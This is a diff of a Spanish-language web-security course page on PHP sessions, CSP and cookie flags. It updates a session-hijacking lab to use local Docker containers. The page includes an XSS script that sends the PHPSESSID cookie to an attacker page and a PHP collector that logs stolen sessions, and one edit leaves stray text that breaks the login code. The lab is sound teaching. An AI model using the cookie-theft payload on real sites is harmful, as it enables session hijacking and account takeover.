@@ -181,8 +181,15 @@ Por ejemplo:
   Content-Security-Policy: default-src 'self' *.trusted.com
   ```
 
-* El administrador de un sitio web desea permitir que los usuarios de una aplicación web incluyan imágenes de cualquier origen en su propio contenido, pero restringen los medios de audio o vídeo a proveedores de confianza, y todas las secuencias de comandos solo a un servidor específico que aloja un código de confianza. Aquí, de forma predeterminada, el contenido solo se permite desde el origen del documento, con las siguientes excepciones:
+* El administrador de un sitio web desea permitir que los usuarios de una aplicación web incluyan imágenes de cualquier origen en su propio contenido, pero restringen los medios de audio o vídeo a proveedores de confianza, y todas las secuencias de comandos solo a un servidor específico que aloja un código de confianza. 
 
+  ```
+  Content-Security-Policy: default-src 'self'; img-src *;
+  	media-src media1.com media2.com; script-src userscripts.example.com
+  ```
+  
+  Aquí, de forma predeterminada, el contenido solo se permite desde el origen del documento, con las siguientes excepciones:
+  
   - Las imágenes pueden cargarse desde cualquier lugar (tenga en cuenta el comodín "*").
   - Los archivos de medios solo están permitidos desde media1.com y media2.com (y no desde los subdominios de esos sitios).  
   - El script ejecutable solo está permitido desde userscripts.example.com.
@@ -216,7 +223,7 @@ if ($_SERVER['REQUEST_METHOD'] == "POST" && !$ya_registrado){
 	$password = $_POST['password'] ?? "";
     
 	$ya_registrado = (in_array($usuario, $valid_users)) && ($password == $all_users[$usuario]);
-	if ($ya_registrado){
+	if ($ya_registrado){login.php
 		$_SESSION['ya_registrado'] = true;
 		$_SESSION['usuario'] = $usuario;
 	}
@@ -243,7 +250,7 @@ Por ejemplo, en este caso la variable de sesión por defecto es `PHPSESSID`
 
 ![image-20210131164900677](/Ciberseguridad-PePS/assets/img/validacion/image-20210131164900677.png)
 
-Para poder desconectar a un usuario se usa el método `session_destroy();`
+Para poder desconectar a un usuario se usa el método `session_destroy();`. Crea el archivo `logout.php`
 
 ```php
 <?php
@@ -262,19 +269,19 @@ Esta pequeña pieza de información es importantísima **desde el punto de vista
 
 Supongamos que  nuestra página es vulnerable a un ataque [XSS](https://owasp.org/www-community/attacks/xss/) (este tipo de ataque se encuentra dentro de los Top 10 según la [OWASP](https://owasp.org/www-project-top-ten/))
 
-Durante el funcionamiento normal, las *cookies* se envían en los  dos sentidos entre el servidor (o grupo de servidores en el mismo  dominio) y el ordenador del usuario que está navegando. Dado que las *cookies* pueden contener información sensible (nombre de usuario, un testigo  utilizado como autenticación, etc.), sus valores no deberían ser  accesibles desde otros ordenadores. Sin embargo, las *cookies* enviadas sobre sesiones HTTP normales son visibles a todos los usuarios que pueden escuchar en la red utilizando un *[sniffer](https://es.wikipedia.org/wiki/Sniffer)* de paquetes. Estas *cookies* no deben contener por lo tanto información sensible. Este problema se puede **solventar mediante el uso de [https](https://es.wikipedia.org/wiki/Https)**, que invoca [seguridad de la capa de transporte](https://es.wikipedia.org/wiki/Transport_Layer_Security) para cifrar la conexión ya que de lo contrario se pueden sufrir ataques por medio de [https://es.wikipedia.org/wiki/Ataque_de_intermediario](https://es.wikipedia.org/wiki/Ataque_de_intermediario)
+Durante el funcionamiento normal, las *cookies* se envían en los dos sentidos entre el servidor (o grupo de servidores en el mismo  dominio) y el ordenador del usuario que está navegando. Dado que las *cookies* pueden contener información sensible (nombre de usuario, un testigo  utilizado como autenticación, etc.), sus valores no deberían ser accesibles desde otros ordenadores. Sin embargo, las *cookies* enviadas sobre sesiones HTTP normales son visibles a todos los usuarios que pueden escuchar en la red utilizando un *[sniffer](https://es.wikipedia.org/wiki/Sniffer)* de paquetes. Estas *cookies* no deben contener por lo tanto información sensible. Este problema se puede **solventar mediante el uso de [https](https://es.wikipedia.org/wiki/Https)**, que invoca [seguridad de la capa de transporte](https://es.wikipedia.org/wiki/Transport_Layer_Security) para cifrar la conexión ya que de lo contrario se pueden sufrir ataques por medio de [https://es.wikipedia.org/wiki/Ataque_de_intermediario](https://es.wikipedia.org/wiki/Ataque_de_intermediario)
 
 **Vamos a ver un secuestro de sesión en directo.**
 
-Para ello es necesario que creemos un host virtual en apache que responda a la url [evil.local](evil.local)
+Para ello es necesario que creemos una imagen docker que responda a la url [127.0.0.1:8081](127.0.0.1:8081) y que va a simular al atacante.
 
-En este host virtual crearemos una página llamada `robo-de-sesion.php` con el siguiente contenido:
+En esta imagen crearemos una página llamada `robo-de-sesion.php` con el siguiente contenido:
 
 ```php
 <?php
 $session_robada = $_GET['session_robada'] ?? "";
 $session_robada .= "\n";
-$fichero = 'sessions.txt';
+$fichero = 'data/sessions.txt';
 // Abre el fichero para obtener el contenido existente
 $actual = file_get_contents($fichero);
 // Escribe el contenido al fichero
@@ -282,9 +289,9 @@ file_put_contents($fichero, $session_robada, FILE_APPEND);
 ```
 
 > **Importante**
-> Para escribir en el fichero `sessions.txt` usa el mismo método que en la [Práctica Docker](https://victorponz.github.io/Ciberseguridad-PePS/tema2/docker/2021/01/09/Pr%C3%A1ctica-Docker.html) hacíamos con el archivo `counter.txt`
+> Para escribir en el fichero `/data/sessions.txt` usa el mismo método que en la [Práctica Docker](https://victorponz.github.io/Ciberseguridad-PePS/tema2/docker/2021/01/09/Pr%C3%A1ctica-Docker.html) hacíamos con el archivo `counter.txt`
 
-Y ahora en el sitio `dominioseguro.local`, crea el siguiente contenido en la página `hackeada.php`
+Ahora crea otra imagen docker que escuche en  [127.0.0.1:8080](127.0.0.1:8080) y que simula la víctima. Crea el siguiente contenido en la página `hackeada.php`
 
 ```html
 <!DOCTYPE html>
@@ -298,16 +305,16 @@ Al acceder, envía la cookie de sesión al sitio http://evil.local
 <script>
 var c = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1")
 var myImage = new Image(1,1);
-myImage.src = "http://evil.local/robar-session.php?session_robada=" + c;
+myImage.src = "http://127.0.0.1:8081/robo-de-sesion.php?session_robada=" + c;
 </script>
 
 </body>
 </html>
 ```
 
-Para que funcione, **primero debes iniciar sesión** en la página `dominioseguro.local/login.php` y después visitar la página `dominioseguro.local/hackeada.html`
+Para que funcione, **primero debes iniciar sesión** en la página `http://127.0.0.1:8080/login.php` y después visitar la página `http://127.0.0.1:8080/hackeada.html`
 
-Ahora abre el archivo `sessions.txt` y comprobarás que tiene una clave de sesión que puedes usar para suplantar al usuario original. Para ello, haz una petición en una página privada a `login.php`, abre la pestaña `Red` en **Firebug** , selecciona la página y pulsa el botón `Reenviar`
+Ahora abre el archivo `sessions.txt` y comprobarás que tiene una clave de sesión que puedes usar para suplantar al usuario original. Para ello, haz una petición a la  página privada a `login.php`, abre la pestaña `Red` en **Firebug** , selecciona la página y pulsa el botón `Reenviar`
 
 ![Firebug](/Ciberseguridad-PePS/assets/img/validacion/image-20210131184754004.png)
 
@@ -339,7 +346,7 @@ Estas dos directivas deberían introducirse en el archivo `php.ini` y el resulta
 Set-Cookie: PHPSESSID=a3fWa; Expires=Wed, 21 Feb 20212 07:28:00 GMT; Secure; HttpOnly
 ```
 
-Si modificamos `login.php` para que incluya esta directiva, comprobaremos que al visitar la página `hackeada.html` la página en `evil.local` ya no recibe la cookie de sesión.
+Si modificamos `login.php` para que incluya esta directiva, comprobaremos que al visitar la página `hackeada.html` la página en [http://127.0.0.1:8081](http://127.0.0.1:8081) ya no recibe la cookie de sesión.
 
 ```php
 <?php
@@ -377,8 +384,6 @@ Más información en la web de [OWASP](https://owasp.org/www-community/attacks/S
 > **Desde el punto de vista de la ciberseguridad**
 >
 > Para evitar este tipo de ataques, la cookie de sesión cuando el usuario ha hecho **login debe ser distinta de la cookie** cuando no se ha iniciado sesión.
-
-
 
 ## Otras consideraciones
 
